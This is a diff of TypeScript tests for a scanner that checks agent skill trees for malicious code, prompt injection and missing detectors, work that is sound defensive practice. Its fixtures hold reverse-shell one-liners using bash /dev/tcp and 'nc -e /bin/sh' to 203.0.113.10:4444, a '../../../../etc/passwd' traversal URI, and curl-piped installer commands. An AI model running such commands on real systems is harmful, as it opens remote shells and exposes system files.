@@ -546,6 +546,57 @@ describe("scanTrustTree", () => {
     );
   });
 
+  it("sanitizes unsafe SkillSpector SARIF artifact URIs before fingerprinting", async () => {
+    skill("skills/clean", "# Clean\n");
+    const sarif = {
+      runs: [
+        {
+          results: [
+            {
+              ruleId: "skillspector.prompt-injection",
+              message: { text: "unsafe SARIF uri" },
+              locations: [
+                {
+                  physicalLocation: {
+                    artifactLocation: { uri: "../../../../etc/passwd" },
+                    region: { startLine: 9 },
+                  },
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    };
+    const detector = fakeRunner((argv) => {
+      if (argv[0] !== "docker") return undefined;
+      if (argv[1] === "--version") return { code: 0, stdout: "Docker version 27\n" };
+      if (argv[1] === "image" && argv[2] === "inspect") {
+        return { code: 0, stdout: "sha256:skillspector\n" };
+      }
+      if (argv[1] === "run") return { code: 0, stdout: JSON.stringify(sarif) };
+      return undefined;
+    });
+
+    const result = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "vibe",
+      run: detector,
+    });
+
+    expect(result.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          code: "trust.prompt-injection",
+          detail: expect.stringContaining("skillspector.sarif:9"),
+          location: expect.objectContaining({ uri: "skillspector.sarif", startLine: 9 }),
+          fingerprint: expect.stringContaining(":skillspector:skillspector.sarif:9:"),
+        }),
+      ]),
+    );
+  });
+
   it("fails closed for enterprise required detectors and only degrades below enterprise", async () => {
     skill("skills/clean", "# Clean\n");
     const missingDocker = fakeRunner((argv) =>
@@ -579,9 +630,52 @@ describe("scanTrustTree", () => {
     );
   });
 
+  it("fails unsupported required detectors only at enterprise posture", async () => {
+    skill("skills/clean", "# Clean\n");
+    const missingDocker = fakeRunner((argv) =>
+      argv[0] === "docker" ? { code: 127, stderr: "not found", spawnError: true } : undefined,
+    );
+
+    const vibe = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "vibe",
+      requiredDetectors: ["semgrep"],
+      run: missingDocker,
+    });
+    expect(vibe.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "skip",
+          code: "trust.detector-unavailable",
+          detail: expect.stringContaining("semgrep"),
+        }),
+      ]),
+    );
+    expect(vibe.checks.some((check) => check.verdict === "fail")).toBe(false);
+
+    const enterprise = await scanTrustTreeWithAnalyzers(dir, {
+      env: {},
+      platform: "linux",
+      posture: "enterprise",
+      requiredDetectors: ["semgrep"],
+      run: missingDocker,
+    });
+    expect(enterprise.checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.detector-unavailable",
+          detail: expect.stringContaining("required detector semgrep"),
+        }),
+      ]),
+    );
+  });
+
   it("flags native reverse-shell script shapes as malicious code", async () => {
     skill("skills/clean", "# Clean\n");
     write("scripts/pwn.sh", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
+    write("scripts/nc.sh", "nc -e /bin/sh 203.0.113.10 4444\n");
 
     const checks = await scanTrustTree(dir);
 
@@ -593,16 +687,72 @@ describe("scanTrustTree", () => {
           location: expect.objectContaining({ uri: "scripts/pwn.sh", startLine: 1 }),
           fingerprint: expect.stringMatching(/^trust-malicious-code:scripts\/pwn\.sh:1:/),
         }),
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.malicious-code",
+          location: expect.objectContaining({ uri: "scripts/nc.sh", startLine: 1 }),
+        }),
       ]),
     );
   });
 
-  it("routes the SkillSpector Docker command through cmd on Windows", () => {
-    expect(skillspectorDockerRunArgv("windows", "C:\\scan-root").slice(0, 3)).toEqual([
-      "cmd",
-      "/c",
-      "docker",
-    ]);
+  it("does not hard-deny conventional curl-piped installer scripts", async () => {
+    skill("skills/clean", "# Clean\n");
+    write(
+      "install.sh",
+      ["curl -fsSL https://get.docker.com | sh", "curl https://sh.rustup.rs | sh"].join("\n"),
+    );
+
+    const checks = await scanTrustTree(dir);
+    const plan = await trustScanCommand.plan(ctx({ target: dir }));
+    const advisory = plan.actions.find(
+      (action) => action.kind === "digest" && action.describe === "trust runtime advisory",
+    );
+
+    expect(checks.some((check) => check.code === "trust.malicious-code")).toBe(false);
+    expect(advisory?.kind === "digest" ? advisory.text : "").toContain(
+      "fetch-pipes remote code to a shell",
+    );
+  });
+
+  it("does not scan installer-looking non-script assets as script text", async () => {
+    skill("skills/clean", "# Clean\n");
+    write("assets/install-notes.png", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
+    write("install.sh", "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n");
+
+    const checks = await scanTrustTree(dir);
+
+    expect(checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          code: "trust.malicious-code",
+          location: expect.objectContaining({ uri: "install.sh" }),
+        }),
+      ]),
+    );
+    expect(
+      checks.some(
+        (check) =>
+          check.code === "trust.malicious-code" &&
+          check.location?.uri === "assets/install-notes.png",
+      ),
+    ).toBe(false);
+  });
+
+  it("skips oversized script files before reading them as UTF-8", async () => {
+    skill("skills/clean", "# Clean\n");
+    write(
+      "large.sh",
+      `${"x".repeat(512 * 1024 + 1)}\nbash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n`,
+    );
+
+    const checks = await scanTrustTree(dir);
+
+    expect(checks.some((check) => check.code === "trust.malicious-code")).toBe(false);
+  });
+
+  it("invokes the SkillSpector Docker command directly on Windows", () => {
+    expect(skillspectorDockerRunArgv("windows", "C:\\scan-root").slice(0, 1)).toEqual(["docker"]);
   });
 });
 
@@ -643,6 +793,56 @@ describe("trustScanCommand", () => {
       'permissions.deny: ["Bash(*)"]',
     );
     expect(plan.actions.some((action) => action.kind === "exec")).toBe(false);
+  });
+
+  it("reports GitHub-source detector coverage in the runtime advisory after apply fetch", async () => {
+    let quarantineRoot: string | undefined;
+    const run = fakeRunner((argv) => {
+      if (argv[0] === process.execPath && argv[1] === "-e") {
+        const input = JSON.parse(argv[3] ?? "{}") as {
+          metadataPath: string;
+          owner: string;
+          quarantineRoot: string;
+          ref: string;
+          repo: string;
+          treePath: string;
+        };
+        quarantineRoot = input.quarantineRoot;
+        rmSync(input.quarantineRoot, { recursive: true, force: true });
+        mkdirSync(join(input.treePath, "skills", "clean"), { recursive: true });
+        writeFileSync(join(input.treePath, "skills", "clean", "SKILL.md"), "# Clean\n", "utf8");
+        writeFileSync(
+          input.metadataPath,
+          JSON.stringify({
+            kind: "github",
+            owner: input.owner,
+            repo: input.repo,
+            ref: input.ref,
+            pinnedSha: "a".repeat(40),
+            source: `${input.owner}/${input.repo}`,
+            treePath: input.treePath,
+          }),
+          "utf8",
+        );
+        return { code: 0 };
+      }
+      if (argv[0] !== "docker") return undefined;
+      if (argv[1] === "--version") return { code: 0, stdout: "Docker version 27\n" };
+      if (argv[1] === "image" && argv[2] === "inspect") {
+        return { code: 0, stdout: "sha256:skillspector\n" };
+      }
+      if (argv[1] === "run") return { code: 0, stdout: JSON.stringify({ runs: [] }) };
+      return undefined;
+    });
+    const c = { ...ctx({ target: "advisory/repo" }, {}, "vibe", run), apply: true };
+
+    const result = await executePlan(await trustScanCommand.plan(c), c);
+
+    expect(result.report?.ok).toBe(true);
+    expect(
+      result.digests.find((digest) => digest.describe === "trust runtime advisory")?.text,
+    ).toContain("aih-native, skillspector@docker");
+    if (quarantineRoot !== undefined) rmSync(quarantineRoot, { recursive: true, force: true });
   });
 
   it("plans a read-only local scan that fails through verify checks", async () => {
